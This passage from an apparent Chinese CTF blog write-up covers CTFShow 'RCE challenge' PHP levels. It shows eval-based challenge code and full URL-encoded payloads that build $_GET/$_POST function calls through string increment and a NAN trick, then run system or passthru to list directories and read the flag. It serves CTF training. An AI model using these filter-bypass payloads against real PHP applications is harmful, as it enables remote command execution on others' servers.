class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">107</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[!@#%^&amp;*:'\\\"|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fucccc hacker!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>过滤了很多，<code>^</code>和<code>~</code>被过滤，所以异或和取反不可行，但可用的还有一些字符，<code>$ _ 1 2 3 C</code>这几个均未被过滤，所以我们这里可以尝试一下通过自增构造，这里限制了长度，要求长度小于<code>107</code>，所以我们这里的话使用构造较短的payload，<code>$_GET[0]($_GET[1])</code>这个相对来说较短，所以这里的话就可以尝试去构造这个payload，我一开始的payload总是不够短，参考了其他师傅的payload后最终构造如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token constant\">C</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//D</span>\n<span class=\"token variable\">$C1</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//E</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//F</span>\n<span class=\"token variable\">$C</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span class=\"token operator\">.</span><span class=\"token variable\">$C1</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//GE</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token constant\">C</span><span class=\"token operator\">/</span><span class=\"token constant\">C</span><span class=\"token operator\">.</span><span class=\"token constant\">C</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//C/C即可得到NAN，但此时的它不是字符串，需要拼接一个字符才能变成字符串，然后第一位就是N</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//O</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//P</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//Q</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//R</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//S</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//T</span>\n<span class=\"token variable\">$C</span><span class=\"token operator\">=</span><span class=\"token constant\">_</span><span class=\"token operator\">.</span><span class=\"token variable\">$C</span><span class=\"token operator\">.</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$$C</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$C</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$C</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//$_GET[0]($GET[1])</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我这里说一下这里缩短长度的几个点，首先一个就是获取字母，比如获取字符<code>E</code>那里，之前我写的话都是<code>$_++;$C1=$_</code>，这种相对来说长度就比较长了，当我们直接这样写，即<code>$C1=++$_</code>时，此时不仅<code>$C1</code>被赋值为<code>E</code>，同时<code>$_</code>也进行了一次自增，因为<code>++$_</code>是先做运算，再赋值的，所以这里是一个缩短长度的点。<br>然后第二个就是获取<code>T</code>这个字符，我们知道<code>T</code>在英语字母中是较靠后的，如果从前靠后只靠自增，字符就过长了，我们这里想到<code>NAN</code>这个字符<code>N</code>是离<code>T</code>较近的，所以我们可以尝试构造<code>N</code>然后再自增获取<code>T</code>，了解到<code>0/0</code>是<code>NAN</code>，这里的<code>C/C</code>也就是<code>NAN</code>，所以我们对他进行一个拼接后获取第一个字符就可以得到<code>N</code>，而后再通过自增即可获取<code>T</code>。<br>第三个点的话就是拼接<code>_GET</code>处，这里的<code>_</code>不用单引号直接拼接也是可以的，这样就省去了两个字符。</p>\n<p>接下来将刚刚构造的payload删去换行这些，然后弄到一行后再进行URL编码，最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span><span class=\"token punctuation\">:</span>\n<span class=\"token number\">1</span><span class=\"token operator\">=</span>passthru<span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">=</span>ls <span class=\"token operator\">/</span>\n<span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>\nctf_show<span class=\"token operator\">=</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>DC<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>C1<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>C<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>C1<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token constant\">C</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>FC<span class=\"token operator\">.</span><span class=\"token constant\">C</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>B0<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>C<span class=\"token operator\">%</span><span class=\"token number\">3</span>D_<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>C<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>C<span class=\"token operator\">%</span><span class=\"token number\">5</span>B1<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>C<span class=\"token operator\">%</span><span class=\"token number\">5</span>B2<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557119.png\" alt=\"在这里插入图片描述\"><br>成功执行<code>ls /</code>命令，接下来读flag即可<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557127.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"CTFShow-RCE挑战2\"><a href=\"#CTFShow-RCE挑战2\" class=\"headerlink\" title=\"CTFShow[RCE挑战2]\"></a>CTFShow[RCE挑战2]</h2><p>环境如下<br><a href=\"https://ctf.show/challenges#RCE%E6%8C%91%E6%88%982-3917\">https://ctf.show/challenges#RCE2</a><br>进入靶场，代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Are you hacking me AGAIN?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看到<code>$</code>、<code>[]</code>、<code>&#39;</code>以及<code>_</code>这几个字符是没有被ban的，所以这里我们可以同之前一样，以自增方式构造命令执行语句，直接利用上面的payload进行尝试</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">GET</span><span class=\"token punctuation\">:</span>\n<span class=\"token constant\">_</span><span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span><span class=\"token constant\">__</span><span class=\"token operator\">=</span>cat <span class=\"token operator\">/</span>f<span class=\"token operator\">*</span>\n<span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>\n<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">5</span>B<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B<span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token string single-quoted-string\">'%24'</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>___<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">2</span>B<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token operator\">%</span><span class=\"token number\">24</span>___<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B_<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>_<span class=\"token operator\">%</span><span class=\"token number\">5</span>B__<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557340.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"CTFShow-RCE挑战3\"><a href=\"#CTFShow-RCE挑战3\" class=\"headerlink\" title=\"CTFShow[RCE挑战3]\"></a>CTFShow[RCE挑战3]</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctf_show'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">105</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z2-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Are you hacking me AGAIN?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里限制了长度为105，然后看过滤的话这里的<code>^</code>和<code>~</code>被ban，所以继续用自增，然后这个时候考虑的<code>$_GET</code>中的<code>T</code>字符相对<code>G</code>和<code>E</code>来说是较靠后的，如果用自增获取会占用很多字符，所以这里可以去尝试构造<code>$_POST</code>，这四个字符相对来说还是挨的比较近的，所以我这里打算构造的语句是<code>$_POST[0]($_POST[1])</code>，接下来我们就可以去构造了。</p>\n<p>首先的话，我们考虑到这个<code>POST</code>四个字符都是偏后的，同时我们这里是有数字<code>0</code>的，所以我们这里可以用<code>0/0</code>来获取<code>float(NAN)</code>，接下来需要把他转换为字符串，因为这个是无法利用的，然后我们这里可以看到<code>&#39;</code>和<code>&quot;</code>都被ban了，所以不能再用，不过我们这里拼接的话，其实随便拼接个什么都可以，我们这里拼接一个下划线也是可以的，所以第一步就有了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//NAN</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//N</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这个时候就成功获取到了字符<code>N</code>，接下来就是先进行赋值获取一个<code>_</code>，然后再通过自增获取<code>POST</code>，最终的话得到的payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">/</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token constant\">_</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//NAN</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//N</span>\n<span class=\"token variable\">$_1</span><span class=\"token operator\">=</span><span class=\"token operator\">++</span><span class=\"token variable\">$_</span><span 